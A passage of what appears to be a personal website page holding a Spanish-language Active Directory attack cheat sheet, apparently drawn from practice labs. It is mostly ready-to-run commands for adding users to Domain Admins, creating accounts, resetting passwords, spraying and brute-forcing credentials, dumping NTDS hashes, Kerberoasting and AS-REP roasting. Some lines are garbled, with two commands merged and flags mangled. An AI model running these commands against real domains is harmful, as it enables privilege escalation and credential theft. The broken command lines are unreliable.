+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> add_to_group</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">CN=usuario,CN=Users,DC=DOMINIO,DC=LOCAL</span><span style="color:#E9F284">"</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">CN=Domain Admins,CN=Users,DC=DOMINIO,DC=LOCAL</span><span style="color:#E9F284">"</span></span>
+<span class="line"></span></code></pre>
+<p>⚡ Exploitation/Machine account creation</p>
+<p>Crear una cuenta de máquina en AD:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> create_computer</span><span style="color:#F1FA8C"> NUEVOPC</span><span style="color:#F8F8F2">$ </span><span style="color:#F1FA8C">Password@123</span></span></code></pre>
+<p>⚡ Exploitation/User creation</p>
+<p>Crear un nuevo usuario de dominio:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> create_user</span><span style="color:#F1FA8C"> fakeuser</span><span style="color:#F1FA8C"> Password@123</span></span></code></pre>
+<p>⚡ Exploitation/Password reset</p>
+<p>Resetear la contraseña de un usuario sin conocer la anterior:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> modify_password</span><span style="color:#F1FA8C"> fakeuser</span><span style="color:#F1FA8C"> Password@1</span></span></code></pre>
+<p>⚡ Exploitation/Account unlock</p>
+<p>Desbloquear cuentas bloqueadas:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> unlock</span><span style="color:#F1FA8C"> usuario</span></span></code></pre>
+<hr>
+<h2 id="1️⃣-acceso-remoto">1️⃣ Acceso remoto</h2>
+<p>Conectarse al escritorio remoto (RDP):</p>
+<p><code>xfreerdp /u:Administrator /p:Password321 /v:10.10.224.147:3389</code></p>
+<hr>
+<h2 id="2️⃣-enumeración-de-recursos-y-usuarios">2️⃣ Enumeración de recursos y usuarios</h2>
+<h3 id="recursos-compartidos">Recursos compartidos</h3>
+<p><code>smbmap -H 10.10.224.147 -u 'Administrator' -p 'Password321'  </code>netexec smb 10.10.224.147 -u ‘Administrator’ -p ‘Password321’ —shares`</p>
+<h3 id="enumerar-usuarios-y-servidores">Enumerar usuarios y servidores</h3>
+<p><code>netexec smb 10.10.224.147 -u 'Administrator' -p 'Password321' --rid-brute</code></p>
+<hr>
+<h2 id="3️⃣-gestión-de-contraseñas">3️⃣ Gestión de contraseñas</h2>
+<h3 id="cambiar-contraseña-de-un-usuario">Cambiar contraseña de un usuario</h3>
+<p><code>Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password')</code></p>
+<p>Alternativa usando <strong>BloodyAD</strong>:</p>
+<p><code>bloodyAD --host '10.10.224.147' -u 'philip' -p 'Claire2008' set password sophie 'Bea123'</code></p>
+<hr>
+<h2 id="4️⃣-reconocimiento-avanzado">4️⃣ Reconocimiento avanzado</h2>
+<h3 id="escaneo-de-usuarios-y-contraseñas-con-crackmapexec">Escaneo de usuarios y contraseñas con CrackMapExec</h3>
+<ul>
+<li>Enumerar usuarios del dominio:</li>
+</ul>
+<p><code>crackmapexec smb IP(AD) -u usuarios.txt -p diccionario.txt --continue-on-success</code></p>
+<ul>
+<li>Solo en un equipo local:</li>
+</ul>
+<p><code>crackmapexec smb IP -u usuarios.txt -p diccionario.txt --local-auth</code></p>
+<ul>
+<li>Comprobar privilegios y política de contraseñas:</li>
+</ul>
+<p><code>crackmapexec smb IP -u usuario -p '1234' --continue-on-success </code>
+<code>crackmapexec smb IP -u usuario -p '1234' --pass-pol </code>
+<code>crackmapexec smb IP -u usuario -p '1234' --users </code></p>
+<ul>
+<li>Dumpear la base de datos del dominio:</li>
+</ul>
+<p><code>crackmapexec smb IP(AD) -u usuario -p '1234' --ntds</code></p>
+<p>Formato de la respuesta: <code>Usuario:ID:LM HASH:NTHASH</code><br>
+Si LM = <code>404ee</code> → LM deshabilitado</p>
+<hr>
+<h3 id="historial-de-contraseñas">Historial de contraseñas</h3>
+<p><code>impacket-secretsdump -just-dc usuario:password@IP -history -pwd-last-secret</code></p>
+<hr>
+<h3 id="ataques-kerberos-sin-ser-admin">Ataques Kerberos (sin ser admin)</h3>
+<ul>
+<li>Obtener SPN y TGS:</li>
+</ul>
+<p><code>impacket-GetUserSPNs -dc-ip IP(AD) dominio.com/usuario:'1234' -request</code></p>
+<ul>
+<li>Crackear hash:</li>
+</ul>
+<p><code>hashcat -m 13100 --force -a 0 hash diccionario.txt john --format=krb5tgs --wordlist=diccionario.txt hash</code></p>
+<hr>
+<h3 id="kerbrute-fuerza-bruta-de-kerberos">Kerbrute (fuerza bruta de Kerberos)</h3>
+<p><code>python3 kerbrute.py -users userlist.txt -passwords passwordlist.txt -domain spookysec.local -t 100</code></p>
+<hr>
+<h3 id="ataque-de-usuarios-sin-contraseña-as-rep-roasting">Ataque de usuarios sin contraseña (AS-REP Roasting)</h3>
+<p><code>impacket-GetNPUsers spookysec.local/svc-admin -no-pass john --wordlist=/rockyou.txt hash</code></p>
+<hr>
+<h2 id="5️⃣-validación-de-credenciales">5️⃣ Validación de credenciales</h2>
+<ul>
+<li>Probar acceso con SMB:</li>
+</ul>
+<p><code>crackmapexec smb IP -u 'svc-admin' -p 'Contraseña'  </code>smbclient -L spooky.local —user ‘svc-admin’ —password ‘contraseña’`</p>
+<ul>
+<li>Acceder a un recurso compartido:</li>
+</ul>
+<p><code>smbclient \\\\spooky.local\\backup --user svc-admin --password management2005</code></p>
+<ul>
+<li>Dumpear credenciales desde un recurso:</li>
+</ul>
+<p><code>impacket-secretsdump -just-dc backup@spookysec.local</code></p>
+<hr> </div> <div class="mt-16 pt-8 border-t border-slate-800"> <a href="/projects" class="text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a la lista de proyectos
+</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
+© 2025 Angel Corral - Todos los derechos reservados.
+</div> </footer> </div> </body></html>
